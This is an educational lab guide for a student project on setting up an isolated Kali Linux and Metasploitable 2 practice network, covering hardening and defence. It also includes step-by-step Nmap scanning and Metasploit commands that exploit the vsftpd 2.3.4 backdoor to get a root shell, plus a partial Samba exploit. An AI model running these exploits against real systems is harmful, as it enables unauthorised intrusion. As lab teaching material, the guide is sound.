04 — Kali Linux

Download & Verify Kali Linux ISO

1
Go to the official Kali download page
https://www.kali.org/get-kali/#kali-installer-images — select Installer (64-bit). File: kali-linux-2026.1-installer-amd64.iso (~3.8–4.2 GB)
2
Get the expected SHA256 hash
On the download page click "Sum" next to the installer. Copy the long hash string — you will compare against it.
3
Verify your download — run the checksum command:

Windows (PowerShell):

Get-FileHash C:\Users\YourName\Downloads\kali-linux-2026.1-installer-amd64.iso -Algorithm SHA256

macOS / Linux (Terminal):

sha256sum ~/Downloads/kali-linux-2026.1-installer-amd64.iso
Expected Result
The hash output matches the website hash character-for-character. If even one character differs, delete the file and re-download.
05 — Network Setup

Create the Isolated Virtual Lab Network

Why Isolation Is Critical
Attack tools send exploit packets that could harm any vulnerable system on the same network. Without isolation you could accidentally attack your router. This setup creates a private virtual network that exists only inside VirtualBox — invisible to your real home network and the internet.
1
Open Network Manager
In VirtualBox Manager: File → Tools → Network Manager → Host-only Networks tab
2
Create a new adapter
Click the green Create (+) button. A network named vboxnet0 (macOS/Linux) or VirtualBox Host-Only Ethernet Adapter (Windows) appears.
3
Configure the adapter settings
Select the new network → Properties → Adapter tab:
IPv4 Address: 192.168.56.1
IPv4 Network Mask: 255.255.255.0
Enable: ticked
4
Disable DHCP Server
Click DHCP Server tab → ensure "Enable Server" is unticked (we assign IPs manually). Click Apply → OK.
Expected Result
A Host-Only network vboxnet0 exists with subnet 192.168.56.0/24. ✅

07 — Target VM

Create the Vulnerable Target VM (Metasploitable 2)

Metasploitable 2 is a purpose-built vulnerable Linux server created by Rapid7. It contains dozens of deliberately insecure services — perfect for practising real attacks legally and safely.

1
Download Metasploitable 2
https://sourceforge.net/projects/metasploitable/files/Metasploitable2/ → click metasploitable-linux-2.0.0.zip (~800 MB)
2
Extract the ZIP
Extract to a folder. You will see Metasploitable.vmdk (the virtual hard disk) — this is the key file.
3
Create the VM in VirtualBox
New VM: Name: Metasploitable-Target · Type: Linux · Version: Ubuntu (64-bit) · RAM: 512 MB · CPU: 1
4
Attach the existing disk
Virtual Hard Disk screen: select "Use an Existing Virtual Hard Disk File" → folder icon → Add → select Metasploitable.vmdk → Choose → Finish
5
Set to Host-only network ONLY
Settings → Network → Adapter 1: Host-only Adapter → vboxnet0. Ensure Adapters 2, 3, 4 are disabled. Click OK.
6
Start and find the IP address
Start the VM → log in with msfadmin / msfadmin → run ifconfig → note the IP (e.g. 192.168.56.101). This is your attack target.
⚠ Critical Security Note
Metasploitable must have NO internet connection. Host-only networking ensures it can only communicate with Kali inside the lab. This is mandatory — Metasploitable with internet access will be compromised by real attackers within minutes.

09 — Defending First

Basic Hardening on the Target VM (Defending Side)

Log into Metasploitable with msfadmin / msfadmin. You will apply defences before attacking — this teaches you both sides of the battle.

Enable UFW Firewall

# Install UFW
sudo apt-get install ufw -y

# Set default policies: deny all incoming, allow all outgoing
sudo ufw default deny incoming
sudo ufw default allow outgoing

# Allow only SSH administration
sudo ufw allow 22/tcp

# Enable firewall
sudo ufw enable

# Verify status
sudo ufw status verbose
Expected Result
Status: active
Default: deny (incoming), allow (outgoing)
22/tcp ALLOW IN Anywhere

Enable System Logging

sudo service rsyslog start
sudo tail -f /var/log/auth.log &
Take a Snapshot
Name it Hardened Baseline — Firewall On before proceeding to attacks.

Attacking Methods — Step-by-Step Practice

All commands run from your Kali Linux VM. Replace 192.168.56.101 with your Metasploitable IP throughout.

Attack 1: Network Reconnaissance with Nmap

Basic host discovery

nmap 192.168.56.101
Expected Output — 23+ open ports including FTP (21), SSH (22), HTTP (80), SMB (139/445), MySQL (3306)

Vulnerability script scan

Attack 3: Metasploit — vsftpd 2.3.4 Backdoor (CVE-2011-2523)

The vsftpd 2.3.4 backdoor is one of the most famous vulnerabilities — a malicious version of the FTP server containing a hardcoded root shell backdoor.

# Launch Metasploit
msfconsole

# Search for the exploit module
msf6 > search vsftpd

# Load the exploit
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor

# Set the target IP
msf6 exploit(vsftpd_234_backdoor) > set RHOSTS 192.168.56.101

# Run it
msf6 exploit(vsftpd_234_backdoor) > run
Expected Output — Root shell achieved ✅
[+] 192.168.56.101:21 - UID: uid=0(root) gid=0(root)
[*] Command shell session 1 opened

id
uid=0(root) gid=0(root) groups=0(root)
📸 Screenshot the root shell immediately — most important evidence screenshot of the project.

Confirm root access and document:

id
whoami
cat /etc/passwd
ls /home

exit

msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(usermap_script) > set RHOSTS 192.168.56.101

11 — Defending

Defending Methods — Step-by-Step Practice

Switch to Metasploitable for all steps in this section.

Block Port Scanning with IPTables

# Drop ICMP ping requests (stops host discovery)
sudo iptables -A INPUT -p icmp --icmp-type echo-request -j DROP

# Rate-limit SYN packets to throttle Nmap scanning
sudo iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT
sudo iptables -A INPUT -p tcp --syn -j DROP

Now go back to Kali and test:

# Should show 100% packet loss
ping -c 4 192.168.56.101

# Should be much slower with many ports showing "filtered"
nmap -sV 192.168.56.101
📸 Screenshot before/after Nmap results side by side — dramatic difference.

Install and Configure fail2ban

sudo apt-get install fail2ban -y
sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local

Edit /etc/fail2ban/jail.local — find the [sshd] section and configure:

[sshd]
enabled = true
maxretry = 3
bantime = 600
findtime = 300
sudo service fail2ban restart
sudo fail2ban-client status sshd

Test — simulate a brute force from Kali

# From Kali: attempt SSH login with wrong password 3 times
ssh msfadmin@192.168.56.101

# Try again — connection should now be refused
ssh msfadmin@192.168.56.101

Check the ban on Metasploitable:

sudo fail2ban-client status sshd
Expected Result — Kali's IP is automatically banned
|- Currently banned: 1
`- Banned IP list: 192.168.56.102
📸 Screenshot fail2ban showing the banned IP — automated intrusion prevention in action.

Monitor Attack Logs in Real Time

sudo tail -f /var/log/auth.log

From Kali, attempt another SSH login. The log shows immediately:

Failed password for msfadmin from 192.168.56.102 port 54321 ssh2
📸 Screenshot the live log entry — this is what SOC analysts look for in real incidents.

14 — Safety

Safety Rules & Best Practices

⚠ Rule 1 — Always Snapshot Before Attacking
Before running any exploit, take a snapshot of both VMs. Restore instantly if something breaks.
⚠ Rule 2 — Never Give Metasploitable Internet Access
This machine is riddled with vulnerabilities by design. With internet access it will be compromised by real attackers within minutes. Check networking every session.
⚠ Rule 3 — Only Attack Machines You Own
Running Nmap, Metasploit, or any offensive tool against any network you do not own is illegal in most countries. This lab exists only on your laptop. Never run these tools externally.
Rule 4 — Power Off VMs When Finished
Shut down both VMs after each session. They consume RAM and could cause issues if left running.
Rule 5 — Keep VirtualBox Updated
Check for VirtualBox updates monthly to protect against hypervisor vulnerabilities.
